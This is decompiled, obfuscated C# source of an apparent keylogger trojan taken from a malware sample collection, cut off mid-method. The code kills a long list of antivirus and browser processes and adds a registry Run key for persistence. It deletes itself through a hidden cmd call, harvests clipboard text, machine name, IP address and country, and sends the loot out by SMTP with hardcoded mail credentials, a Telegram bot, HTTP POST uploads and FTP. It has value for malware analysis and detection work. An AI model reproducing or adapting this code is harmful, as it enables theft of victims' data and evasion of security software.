// Decompiled with JetBrains decompiler
// Type: ε�œK�.�k�kٷ
// Assembly: iJMJnUDAnLMGBkvrphkwZ, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8BCFE5CC-61DE-4CD2-8DAF-2FBF230839CD
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.Win32.Generic-5067186ee6f83892e2d9e56ec500c4a4eb78c83006033b7f4ea166072624c87e.exe

using \uFFFDԹУ㹃Ϙ;
using \uFFFDޗ\uFFFDթζ;
using Ɖ늻\u02E8\uFFFD\u0040;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml;
using ε\uFFFDœK\uFFFD;

namespace ε\uFFFDœK\uFFFD
{
  [StandardModule]
  internal sealed class \uFFFDk\uFFFDkٷ
  {
    public static string \uDB0A\uDE26\u003BŚ\uF0B9;
    public static string Wթ\uFFFDӛ\u00BE;
    public static string ҡ盀ٗ\uFFFD蠺 = ".txt";
    private static Process[] Ԝ̱\uFFFDƜߟ = Process.GetProcesses();
    private static string \uFFFD䕃\uFFFDŲԜ;
    private static string \uFFFD\uFFFDϫ皍쐬;
    public static string \u00AB丐ʭҡӚ;
    private static string ҏ\u05C3ۚ똛ë;
    private static \uFFFDk\uFFFDkٷ.KeyLogger ב\u1CFC\u07B8̲ߟ;
    private static StringBuilder Ł\uFFFDĪג\u07FB;
    private static object Ԝë\uFFFD嵱Ś;
    private static object jKג\u05C9䇹;
    private static object \u0739\uFFFDҟӥŴ;
    private static string 鈇ô蠺Kş;
    private static object ôӚϒЅş;
    private static string \u07FBRľKӺ;
    private static string 嵱Αӥۨϫ;
    private static string \u07C2䕃\uFFFDՕé;
    private static string \u0089\uDBCC\uDC77ۨʤ;
    private static string 䕃հϒ\uFFFDζ;
    private static string \uFFFD\u00BEӥ\u00BE\u061D;
    private static string 퓜\uFFFDی̲\uFFFD;
    private static string \u26CA鈇ŲRR;
    private static string ēCŎϘ\u07FB;
    private static string Ȩ\u1CFCגēݝ;
    private static string \uFFFD\uFFFDtʪ盀;
    private static string \u07C2ҏ\u0089\uFFFDߡ;
    public static string ҭ\u05C9\uFFFDʤΑ;
    private static object ݶƟ\u07B8ƌִ;

    static \uFFFDk\uFFFDkٷ()
    {
      \uFFFDk\uFFFDkٷ.KƌWɩB = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.\uFFFDܣųϒި = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.ϒΠ\uFFFDՄ㹃 = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.䇹і̧\u05C9㹃 = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.\uD9C5\uDEEAåC㹃 = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.ԜƟל\uFFFDӚ = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.Цi\uFFFD\u26CA\uFFFD = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.Մӓ쐬\uFFFD\u0609 = new System.Windows.Forms.Timer();
      \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬 = "$%SMTPDV$";
      \uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ = "";
      \uFFFDk\uFFFDkٷ.ҏ\u05C3ۚ똛ë = "$#TheHashHere%&";
      \uFFFDk\uFFFDkٷ.Ł\uFFFDĪג\u07FB = new StringBuilder();
      \uFFFDk\uFFFDkٷ.Ԝë\uFFFD嵱Ś = (object) "False";
      \uFFFDk\uFFFDkٷ.jKג\u05C9䇹 = (object) "False";
      \uFFFDk\uFFFDkٷ.\u0739\uFFFDҟӥŴ = (object) "False";
      \uFFFDk\uFFFDkٷ.鈇ô蠺Kş = "$ProtectPass%";
      \uFFFDk\uFFFDkٷ.ôӚϒЅş = (object) "ProtectFalse";
      \uFFFDk\uFFFDkٷ.\u07FBRľKӺ = "True";
      \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object) (" \r\n\r\nPC Name:" + Environment.MachineName), Operators.AddObject((object) "\r\nDate and Time: ", \uFFFDk\uFFFDkٷ.\u0739\uFFFDΑٚӥ())), Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject(Operators.AddObject((object) "\r\nClient IP: ", \uFFFDk\uFFFDkٷ.Թ\uFFFDϒӚک()), (object) "\r\n"), (object) "Country Name: "), \uFFFDk\uFFFDkٷ.\uFFFD\uFFFD㠰ϫԜ()), (object) "\r\n")));
      \uFFFDk\uFFFDkٷ.\u07C2䕃\uFFFDՕé = "smtpfox-rw34b@seekmyjob.com";
      \uFFFDk\uFFFDkٷ.\u0089\uDBCC\uDC77ۨʤ = "company@19604190";
      \uFFFDk\uFFFDkٷ.䕃հϒ\uFFFDζ = "mail.seekmyjob.com";
      \uFFFDk\uFFFDkٷ.\uFFFD\u00BEӥ\u00BE\u061D = "masterwork123logs@gmail.com";
      \uFFFDk\uFFFDkٷ.퓜\uFFFDی̲\uFFFD = "587";
      \uFFFDk\uFFFDkٷ.\u26CA鈇ŲRR = "";
      \uFFFDk\uFFFDkٷ.ēCŎϘ\u07FB = "";
      \uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ = "";
      \uFFFDk\uFFFDkٷ.\uFFFD\uFFFDtʪ盀 = "";
      \uFFFDk\uFFFDkٷ.\u07C2ҏ\u0089\uFFFDߡ = "";
      \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ = (object) ("ZyiAEnXWZP" + new Random().Next().ToString());
    }

    public static System.Windows.Forms.Timer KƌWɩB
    {
      get => \uFFFDk\uFFFDkٷ.ľݶٗꓞܹ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDk\uFFFDkٷ.ô\uFFFDٕ蠺\u002D);
        System.Windows.Forms.Timer ľݶٗꓞܹ1 = \uFFFDk\uFFFDkٷ.ľݶٗꓞܹ;
        if (ľݶٗꓞܹ1 != null)
          ľݶٗꓞܹ1.Tick -= eventHandler;
        \uFFFDk\uFFFDkٷ.ľݶٗꓞܹ = value;
        System.Windows.Forms.Timer ľݶٗꓞܹ2 = \uFFFDk\uFFFDkٷ.ľݶٗꓞܹ;
        if (ľݶٗꓞܹ2 == null)
          return;
        ľݶٗꓞܹ2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer \uFFFDܣųϒި
    {
      get => \uFFFDk\uFFFDkٷ.\u0331㹃ٗΑ\uFFFD;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDk\uFFFDkٷ.\u0306\uFFFDë븤Ң);
        System.Windows.Forms.Timer timer1 = \uFFFDk\uFFFDkٷ.\u0331㹃ٗΑ\uFFFD;
        if (timer1 != null)
          timer1.Tick -= eventHandler;
        \uFFFDk\uFFFDkٷ.\u0331㹃ٗΑ\uFFFD = value;
        System.Windows.Forms.Timer timer2 = \uFFFDk\uFFFDkٷ.\u0331㹃ٗΑ\uFFFD;
        if (timer2 == null)
          return;
        timer2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer ϒΠ\uFFFDՄ㹃
    {
      get => \uFFFDk\uFFFDkٷ.\uFFFD̀\uFFFD\uDB17\uDE2B;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDk\uFFFDkٷ.Ϙ\uFFFDΩלﾭ);
        System.Windows.Forms.Timer timer1 = \uFFFDk\uFFFDkٷ.\uFFFD̀\uFFFD\uDB17\uDE2B;
        if (timer1 != null)
          timer1.Tick -= eventHandler;
        \uFFFDk\uFFFDkٷ.\uFFFD̀\uFFFD\uDB17\uDE2B = value;
        System.Windows.Forms.Timer timer2 = \uFFFDk\uFFFDkٷ.\uFFFD̀\uFFFD\uDB17\uDE2B;
        if (timer2 == null)
          return;
        timer2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer 䇹і̧\u05C9㹃
    {
      get => \uFFFDk\uFFFDkٷ.\uFFFDՕ뫆ųΑ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDk\uFFFDkٷ.\u0331\u02E8ߡåԹ);
        System.Windows.Forms.Timer օ뫆ųΑ1 = \uFFFDk\uFFFDkٷ.\uFFFDՕ뫆ųΑ;
        if (օ뫆ųΑ1 != null)
          օ뫆ųΑ1.Tick -= eventHandler;
        \uFFFDk\uFFFDkٷ.\uFFFDՕ뫆ųΑ = value;
        System.Windows.Forms.Timer օ뫆ųΑ2 = \uFFFDk\uFFFDkٷ.\uFFFDՕ뫆ųΑ;
        if (օ뫆ųΑ2 == null)
          return;
        օ뫆ųΑ2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("kLLTIm")]
    public static System.Windows.Forms.Timer \uD9C5\uDEEAåC㹃 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static System.Windows.Forms.Timer ԜƟל\uFFFDӚ
    {
      get => \uFFFDk\uFFFDkٷ.\u02F3ﾭkZ蠺;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDk\uFFFDkٷ.\u061CגҢĂٚ);
        System.Windows.Forms.Timer ﾭkZ蠺1 = \uFFFDk\uFFFDkٷ.\u02F3ﾭkZ蠺;
        if (ﾭkZ蠺1 != null)
          ﾭkZ蠺1.Tick -= eventHandler;
        \uFFFDk\uFFFDkٷ.\u02F3ﾭkZ蠺 = value;
        System.Windows.Forms.Timer ﾭkZ蠺2 = \uFFFDk\uFFFDkٷ.\u02F3ﾭkZ蠺;
        if (ﾭkZ蠺2 == null)
          return;
        ﾭkZ蠺2.Tick += eventHandler;
      }
    }

    public static System.Windows.Forms.Timer Цi\uFFFD\u26CA\uFFFD
    {
      get => \uFFFDk\uFFFDkٷ.\u0385C\uFFFDЦչ;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(\uFFFDk\uFFFDkٷ.\uFFFDBӓҚ\uFFFD);
        System.Windows.Forms.Timer cЦչ1 = \uFFFDk\uFFFDkٷ.\u0385C\uFFFDЦչ;
        if (cЦչ1 != null)
          cЦչ1.Tick -= eventHandler;
        \uFFFDk\uFFFDkٷ.\u0385C\uFFFDЦչ = value;
        System.Windows.Forms.Timer cЦչ2 = \uFFFDk\uFFFDkٷ.\u0385C\uFFFDЦչ;
        if (cЦչ2 == null)
          return;
        cЦչ2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("ProHfutimer")]
    public static System.Windows.Forms.Timer Մӓ쐬\uFFFD\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    public static void 뜸쐬\uFFFDܪ\uFFFD()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (\uFFFDk\uFFFDkٷ.Ԝ̱\uFFFDƜߟ.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(\uFFFDk\uFFFDkٷ.Ԝ̱\uFFFDƜߟ[index].ProcessName), "chrome", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        \uFFFDk\uFFFDkٷ.Ԝ̱\uFFFDƜߟ[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void \uFFFDݶȨÒˤ()
    {
      int num1;
      int num2;
      try
      {
label_2:
        ProjectData.ClearProjectError();
        num1 = -2;
label_3:
        int num3 = 2;
        int num4 = checked (\uFFFDk\uFFFDkٷ.Ԝ̱\uFFFDƜߟ.Length - 1);
        int index = 0;
        goto label_8;
label_4:
        num3 = 3;
        if (Operators.CompareString(Strings.LCase(\uFFFDk\uFFFDkٷ.Ԝ̱\uFFFDƜߟ[index].ProcessName), "firefox", false) != 0)
          goto label_6;
label_5:
        num3 = 5;
        \uFFFDk\uFFFDkٷ.Ԝ̱\uFFFDƜߟ[index].Kill();
label_6:
label_7:
        num3 = 8;
        checked { ++index; }
label_8:
        if (index <= num4)
          goto label_4;
        else
          goto label_15;
label_10:
        num2 = num3;
        switch (num1 > -2 ? num1 : 1)
        {
          case 1:
            int num5 = num2 + 1;
            num2 = 0;
            switch (num5)
            {
              case 1:
                goto label_2;
              case 2:
                goto label_3;
              case 3:
                goto label_4;
              case 4:
              case 6:
              case 7:
                goto label_6;
              case 5:
                goto label_5;
              case 8:
                goto label_7;
              case 9:
                goto label_15;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_10;
      }
      throw ProjectData.CreateProjectError(-2146828237);
label_15:
      if (num2 == 0)
        return;
      ProjectData.ClearProjectError();
    }

    public static void ʪ\uFFFD\u005E\uFFFD\u0609()
    {
      string[] strArray1 = new string[194]
      {
        "zlclient",
        "egui",
        "bdagent",
        "npfmsg",
        "olydbg",
        "anubis",
        "wireshark",
        "avastui",
        "_Avp32",
        "vsmon",
        "mbam",
        "keyscrambler",
        "_Avpcc",
        "_Avpm",
        "Ackwin32",
        "Outpost",
        "Anti-Trojan",
        "ANTIVIR",
        "Apvxdwin",
        "ATRACK",
        "Autodown",
        "Avconsol",
        "Ave32",
        "Avgctrl",
        "Avkserv",
        "Avnt",
        "Avp",
        "Avp32",
        "Avpcc",
        "Avpdos32",
        "Avpm",
        "Avptc32",
        "Avpupd",
        "Avsched32",
        "AVSYNMGR",
        "Avwin95",
        "Avwupd32",
        "Blackd",
        "Blackice",
        "Cfiadmin",
        "Cfiaudit",
        "Cfinet",
        "Cfinet32",
        "Claw95",
        "Claw95cf",
        "Cleaner",
        "Cleaner3",
        "Defwatch",
        "Dvp95",
        "Dvp95_0",
        "Ecengine",
        "Esafe",
        "Espwatch",
        "F-Agnt95",
        "Findviru",
        "Fprot",
        "F-Prot",
        "F-Prot95",
        "Fp-Win",
        "Frw",
        "F-Stopw",
        "Iamapp",
        "Iamserv",
        "Ibmasn",
        "Ibmavsp",
        "Icload95",
        "Icloadnt",
        "Icmon",
        "Icsupp95",
        "Icsuppnt",
        "Iface",
        "Iomon98",
        "Jedi",
        "Lockdown2000",
        "Lookout",
        "Luall",
        "MCAFEE",
        "Moolive",
        "Mpftray",
        "N32scanw",
        "NAVAPSVC",
        "NAVAPW32",
        "NAVLU32",
        "Navnt",
        "NAVRUNR",
        "Navw32",
        "Navwnt",
        "NeoWatch",
        "NISSERV",
        "Nisum",
        "Nmain",
        "Normist",
        "NORTON",
        "Nupgrade",
        "Nvc95",
        "Outpost",
        "Padmin",
        "Pavcl",
        "Pavsched",
        "Pavw",
        "PCCIOMON",
        "PCCMAIN",
        "Pccwin98",
        "Pcfwallicon",
        "Persfw",
        "POP3TRAP",
        "PVIEW95",
        "Rav7",
        "Rav7win",
        "Rescue",
        "Safeweb",
        "Scan32",
        "Scan95",
        "Scanpm",
        "Scrscan",
        "Serv95",
        "Smc",
        "SMCSERVICE",
        "Snort",
        "Sphinx",
        "Sweep95",
        "SYMPROXYSVC",
        "Tbscan",
        "Tca",
        "Tds2-98",
        "Tds2-Nt",
        "TermiNET",
        "Vet95",
        "Vettray",
        "Vscan40",
        "Vsecomr",
        "Vshwin32",
        "Vsstat",
        "Webscanx",
        "WEBTRAP",
        "Wfindv32",
        "Zonealarm",
        "LOCKDOWN2000",
        "RESCUE32",
        "LUCOMSERVER",
        "avgcc",
        "avgcc",
        "avgamsvr",
        "avgupsvc",
        "avgw",
        "avgcc32",
        "avgserv",
        "avgserv9",
        "avgserv9schedapp",
        "avgemc",
        "ashwebsv",
        "ashdisp",
        "ashmaisv",
        "ashserv",
        "aswUpdSv",
        "symwsc",
        "norton",
        "Norton Auto-Protect",
        "norton_av",
        "nortonav",
        "ccsetmgr",
        "ccevtmgr",
        "avadmin",
        "avcenter",
        "avgnt",
        "avguard",
        "avnotify",
        "avscan",
        "guardgui",
        "nod32krn",
        "nod32kui",
        "clamscan",
        "clamTray",
        "clamWin",
        "freshclam",
        "oladdin",
        "sigtool",
        "w9xpopen",
        "Wclose",
        "cmgrdian",
        "alogserv",
        "mcshield",
        "vshwin32",
        "avconsol",
        "vsstat",
        "avsynmgr",
        "avcmd",
        "avconfig",
        "licmgr",
        "sched",
        "preupd",
        "MsMpEng",
        "MSASCui",
        "Avira.Systray"
      };
      Process[] processes = Process.GetProcesses();
      int index1 = 0;
      while (index1 < processes.Length)
      {
        Process process = processes[index1];
        string[] strArray2 = strArray1;
        int index2 = 0;
        while (index2 < strArray2.Length)
        {
          string Right = strArray2[index2];
          if (Operators.CompareString(process.ProcessName, Right, false) == 0)
          {
            process.Kill();
            break;
          }
          checked { ++index2; }
        }
        checked { ++index1; }
      }
    }

    public static object ﾭ㠰ŧ\uFFFDЮ(string _param0)
    {
      if (Process.GetProcessesByName(_param0).Length > 0)
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static object \uFFFDŔƚҡƉ(string _param0)
    {
      if (System.IO.File.Exists(_param0))
        Process.GetCurrentProcess().Kill();
      return (object) null;
    }

    public static string RٵƉζҏ(string _param0)
    {
      SHA256 shA256 = SHA256.Create();
      FileStream inputStream = System.IO.File.OpenRead(_param0);
      inputStream.Position = 0L;
      byte[] hash = shA256.ComputeHash((Stream) inputStream);
      inputStream.Close();
      string str = "";
      int num = checked (hash.Length - 1);
      int index = 0;
      while (index <= num)
      {
        str += hash[index].ToString("X2");
        checked { ++index; }
      }
      return str.ToLower();
    }

    public static void \u07FBأհ\uFFFDj()
    {
      try
      {
        Process.Start(new ProcessStartInfo()
        {
          Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true,
          FileName = "cmd.exe"
        });
        Environment.Exit(1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int \uFFFDױ\u0097ϒ\uFFFD(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("kernel32", EntryPoint = "ExitProcess", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int לˤҡŚ皍(uint 뜸؜Ӥױܣ);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern int 皍Π䇹鈇\uFFFD([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

    public static void kŎ\uFFFDթ\uFFFD()
    {
    }

    public static void ݶ츠ëŧԜ(string _param0, string _param1)
    {
      try
      {
        Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue(_param0, (object) _param1, RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \uFFFD\u05C3ʤŔչ(
      string Uߡ똛ëJ,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) Uߡ똛ëJ, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void \uFFFDۣל\uFFFD\uFFFD(
      string ΑܹkŴA,
      string _param1,
      string _param2,
      string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) ΑܹkŴA, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ΑިȨˤ늻(string ľWŧľҢ, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        Stream stream = (Stream) new MemoryStream();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = _param3;
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) ľWŧľҢ, (object) _param1, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param2, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private static void ƚ꾯اӛΑ(byte[] _param0, string _param1, string _param2, string _param3)
    {
      try
      {
        WebClient webClient = new WebClient();
        string str1 = "------------------------" + DateTime.Now.Ticks.ToString("x");
        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + str1);
        string str2 = webClient.Encoding.GetString(_param0);
        string s = string.Format("--{0}\r\nContent-Disposition: form-data; name=\"document\"; filename=\"{1}\"\r\nContent-Type: {2}\r\n\r\n{3}\r\n--{0}--\r\n", (object) str1, (object) _param1, (object) _param2, (object) str2);
        byte[] bytes = webClient.Encoding.GetBytes(s);
        webClient.UploadData(_param3, "POST", bytes);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void 퓜şi\uFFFD뫆(string ņ븤jϫş, string _param1, string _param2)
    {
      try
      {
        string requestUriString = "https://api.telegram.org/bot" + ņ븤jϫş + "/sendMessage?chat_id=" + _param1 + "&text=" + _param2;
        ServicePointManager.Expect100Continue = false;
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
        HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(requestUriString);
        string empty = string.Empty;
        try
        {
          using (Stream responseStream = httpWebRequest.GetResponse().GetResponseStream())
            new StreamReader(responseStream, Encoding.UTF8).ReadToEnd();
        }
        catch (WebException ex)
        {
          ProjectData.SetProjectError((Exception) ex);
          WebException webException = ex;
          empty = webException.Message.ToString();
          using (Stream responseStream = webException.Response.GetResponseStream())
            new StreamReader(responseStream, Encoding.GetEncoding("utf-8")).ReadToEnd();
          throw;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static string ë\uFFFD㹃ƌۣ(string _param0, string _param1)
    {
      DESCryptoServiceProvider cryptoServiceProvider1 = new DESCryptoServiceProvider();
      MD5CryptoServiceProvider cryptoServiceProvider2 = new MD5CryptoServiceProvider();
      byte[] destinationArray = new byte[8];
      Array.Copy((Array) cryptoServiceProvider2.ComputeHash(Encoding.ASCII.GetBytes(_param1)), 0, (Array) destinationArray, 0, 8);
      cryptoServiceProvider1.Key = destinationArray;
      cryptoServiceProvider1.Mode = CipherMode.ECB;
      ICryptoTransform encryptor = cryptoServiceProvider1.CreateEncryptor();
      byte[] bytes = Encoding.ASCII.GetBytes(_param0);
      return Convert.ToBase64String(encryptor.TransformFinalBlock(bytes, 0, bytes.Length));
    }

    public static object \u032EבۨܪŲ()
    {
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      long num;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (driveInfo.IsReady)
          checked { num += driveInfo.TotalSize; }
        checked { ++index; }
      }
      return (object) (Conversions.ToString(checked ((long) Math.Round(unchecked ((double) num / 1048576.0 / 1024.0)))) + " GB");
    }

    public static object \u0739\uFFFDΑٚӥ() => (object) (Conversions.ToString(DateAndTime.Today) + " / " + Conversions.ToString(DateAndTime.TimeOfDay));

    public static object 䕃Jҭ䇹\u00AB() => (object) Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Info.OSFullName;

    public static object Ɯϒ\u0609\u060C\uFFFD() => (object) Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Info.OSVersion;

    public static object ϒ䕃Ԍ\u00BEߟ() => (object) string.Format("{0:f2} GB", (object) ((double) Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Info.TotalPhysicalMemory / 1073741824.0));

    public static object Թ\uFFFDϒӚک()
    {
      WebClient webClient = new WebClient();
      webClient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)");
      string address = "http://checkip.dyndns.org/";
      IWebProxy systemWebProxy = WebRequest.GetSystemWebProxy();
      systemWebProxy.Credentials = (ICredentials) CredentialCache.DefaultNetworkCredentials;
      webClient.Proxy = systemWebProxy;
      Stream stream;
      try
      {
        stream = webClient.OpenRead(address);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      StreamReader streamReader = new StreamReader(stream);
      string end = streamReader.ReadToEnd();
      stream.Close();
      streamReader.Close();
      return (object) end.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString();
    }

    public static object \uFFFD\uFFFD㠰ϫԜ()
    {
      XmlDocument Instance = new XmlDocument();
      object obj = Operators.AddObject((object) "https://freegeoip.app/xml/", \uFFFDk\uFFFDkٷ.Թ\uFFFDϒӚک());
      object[] objArray;
      bool[] flagArray;
      NewLateBinding.LateCall((object) Instance, (System.Type) null, "Load", objArray = new object[1]
      {
        obj
      }, (string[]) null, (System.Type[]) null, flagArray = new bool[1]
      {
        true
      }, true);
      if (flagArray[0])
        RuntimeHelpers.GetObjectValue(objArray[0]);
      XmlNodeList elementsByTagName = Instance.GetElementsByTagName("CountryName");
      string str = "";
      try
      {
        foreach (XmlElement xmlElement in elementsByTagName)
          str = xmlElement.InnerText;
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return (object) str;
    }

    public static byte[] \uD974\uDD61㹃Πٵ() => Encoding.Unicode.GetBytes("Clipboard | " + Environment.UserName + " | Snake\r\n" + \uFFFDk\uFFFDkٷ.嵱Αӥۨϫ + "\r\n\r\n\r\n" + \uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ + "\r\n\r\n--------------------------------------------------");

    public static void Ϙ\uFFFDΩלﾭ(object _param0, EventArgs _param1)
    {
      if (\uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ.ToString().Contains(Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>")))
        return;
      \uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ = \uFFFDk\uFFFDkٷ.\u00AB丐ʭҡӚ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Clipboard.GetText().Replace(".", "<.>").Replace("http", "<http>") + "\r\n";
    }

    public static void \u0331\u02E8ߡåԹ(object _param0, EventArgs ڿˤ̔Òľ)
    {
      if (Operators.CompareString(\uFFFDk\uFFFDkٷ.\uFFFD\uFFFDϫ皍쐬, "%FTPDV$", false) == 0)
      {
        FtpWebRequest ftpWebRequest = (FtpWebRequest) NewLateBinding.LateGet((object) null, typeof (WebRequest), "Create", new object[1]
        {
          Operators.AddObject(Operators.AddObject((object) (\uFFFDk\uFFFDkٷ.Ȩ\u1CFCגēݝ + Ӥ\uD9EE\uDC98\uFFFD恁.Օk\uFFFD\u0089̳.Name + " - Clipboard Logs ID - "), \uFFFDk\uFFFDkٷ.ݶƟ\u07B8ƌִ), (object) \uFFFDk\uFFFDkٷ.ҡ盀ٗ\uFFFD蠺)
        }, (string[]) null, (System.Type[]) null, (bool[]) null);
        try
        {
